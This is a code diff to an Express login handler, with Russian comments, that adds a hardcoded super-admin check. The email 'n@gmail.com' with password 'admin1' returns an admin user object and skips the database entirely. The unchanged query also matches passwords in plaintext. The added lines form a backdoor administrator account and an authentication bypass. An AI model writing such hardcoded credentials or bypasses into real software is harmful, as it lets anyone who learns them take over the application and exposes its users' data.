@@ -4,8 +4,20 @@ exports.login = (req, res) => {
     if (!email || !password) {
         return res.status(400).json({ error: 'Введите email и пароль' });
     }
+
     const targetEmail = String(email).trim().toLowerCase();
     const targetPassword = String(password).trim();
+
+    // ПРОВЕРКА НА СУПЕР-АДМИНА ПРЯМО В КОДЕ
+    if (targetEmail === 'n@gmail.com' && targetPassword === 'admin1') {
+        return res.status(200).json({
+            id: 999,
+            fullname: 'Администратор',
+            email: 'n@gmail.com',
+            phone: '87775124548',
+            role: 'admin'
+        });
+    }
     db.get(
         'SELECT id, name, email, phone, role FROM users WHERE LOWER(email) = ? AND password = ?',
         [targetEmail, targetPassword],
